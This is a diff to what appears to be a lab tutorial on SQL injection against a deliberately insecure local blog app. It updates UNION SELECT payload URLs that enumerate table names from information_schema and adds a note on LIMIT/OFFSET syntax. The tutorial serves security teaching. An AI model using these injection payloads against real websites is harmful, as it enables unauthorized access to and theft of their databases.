@@ -34,7 +34,7 @@ where:
 
 Then we inject the query in the browser:
 ```shell
-http://localhost:8080/p/2 UNION SELECT 1,(SELECT distinct(table_name) FROM information_schema.columns WHERE table_schema = 'insecure_blog'),3,4,5,6,7,8,9/slug-name-post'
+http://localhost:8080/p/2 UNION SELECT 1,(SELECT distinct(table_name) FROM information_schema.columns WHERE table_schema = 'insecure_blog'),3,4,5,6,7,8,9,10/slug-name-post'
 ```
 
 This query, just like in the previous step will return an error:
@@ -47,10 +47,11 @@ This query, just like in the previous step will return an error:
 
 We can use the same trick (*LIMIT + OFFSET*) to get the job done:
 ```shell
-http://localhost:8080/p/2 UNION SELECT 1,(SELECT distinct(table_name) FROM information_schema.columns WHERE table_schema = 'insecure_blog' LIMIT 1 OFFSET 0),3,4,5,6,7,8,9/slug-name-post'
+http://localhost:8080/p/2 UNION SELECT 1,(SELECT distinct(table_name) FROM information_schema.columns WHERE table_schema = 'insecure_blog' LIMIT 1 OFFSET 0),3,4,5,6,7,8,9,10/slug-name-post'
 ```
 
 And keep **increasing the OFFSET** value to get all the tables.
+Instead of **LIMIT 1 OFFSET 0** you can use **LIMIT 0,1**
 
 --
 
